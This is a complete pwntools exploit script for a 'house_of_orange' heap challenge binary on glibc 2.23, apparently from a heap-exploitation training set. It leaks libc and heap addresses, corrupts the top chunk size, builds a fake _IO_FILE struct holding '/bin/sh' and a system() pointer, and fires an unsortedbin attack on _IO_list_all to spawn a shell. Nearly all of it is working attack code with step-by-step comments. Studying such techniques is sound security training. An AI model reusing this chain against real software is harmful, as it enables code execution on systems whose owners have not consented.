#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_orange', checksec=False)

libc = ELF('../.glibc/glibc_2.23/libc.so.6', checksec=False)
#libc = elf.libc

gs = """
b *main
b *main+287
b *main+353
b *main+412
b *main+478
b *_IO_flush_all_lockp
"""

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc_small():
    io.sendline(b'1')
    io.recvuntil(b'> ')
    
def malloc_large():
    #io.sendline(b'2')
    #io.recvuntil(b'> ')
    io.sendthen(b"> ", b"2")

def edit(data):
    io.sendline(b'3')
    io.sendlineafter(b'data: ', data)
    io.recvuntil(b'> ')

def quit():
    io.send(b'4')

io = start()
io.timeout = 0.1
io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
io.recvuntil(b'heap @ ')
heap = int(io.recvline(), 16)
libc.address = puts - libc.sym['puts']

info("libc base: " + hex(libc.address))

#===============================================================================================
# Create unsortedbin list

io.recvuntil(b'> ')
malloc_small()

#overwrite top chunk size field to initial new heap from kernel
edit(b'Y'*0x18 + p64(0x1000 - 0x20 + 1))

malloc_large()

#===============================================================================================
#unsortedbin attack

# =-=-=- PREPARE A FAKE _IO_FILE STRUCT -=-=-=

# Set up a fake _IO_FILE struct alongside an unsortedbin attack.
# This chunk is sorted into the 0x60 smallbin later, meaning a pointer to it will form
# the _chain member of the _IO_FILE struct overlapping the main arena.

#fp
flag = b'/bin/sh\x00'

size = 0x61
# A chunk's fd is ignored during a partial unlink.
fd = 0x0

# Set up the bk pointer of this free chunk to point near _IO_list_all.
# This way _IO_list_all is overwritten by a pointer to the unsortedbin during the unsortedbin attack.
bk = libc.sym['_IO_list_all'] - 0x10

# Ensure fp->_IO_write_ptr > fp->_IO_write_base.
write_base = 0x01
write_ptr = 0x02

# Ensure fp->_mode <= 0.
mode = 0x0

# For convenience place the pointer to system() in the last qword of the _IO_FILE struct,
# which is part of the _unused2 area.
# Set up the vtable pointer so that the __overflow entry overlaps this pointer.
vtable_ptr = heap + 0xd8



unsortedbin_attack = b'Y'*16 +\
flag + p64(size) +\
p64(fd)  + p64(bk) +\
p64(write_base) + p64(write_ptr) + p64(0)*18 +\
p32(mode) + p8(0)*12 +\
p64(libc.sym['system']) + p64(vtable_ptr)

edit(unsortedbin_attack)


# =-=-=- TRIGGER UNSORTEDBIN ATTACK -=-=-=

# Request the second small chunk, this sorts the old top chunk into the 0x60 smallbin and in doing so triggers
# the unsortedbin attack against _IO_list_all.
# The "chunk" at _IO_list_all will fail a size sanity check, causing malloc to call abort(). This in turn will
# call _IO_flush_all_lockp().
# The main arena (sometimes) fails the _IO_OVERFLOW checks and fp->_chain is followed which points to the old
# top chunk. Now the fake _IO_FILE struct is processed and the _IO_OVERFLOW checks will pass, the fake
# vtable pointer is followed and the fake __overflow entry is called.
malloc_small()

io.interactive()
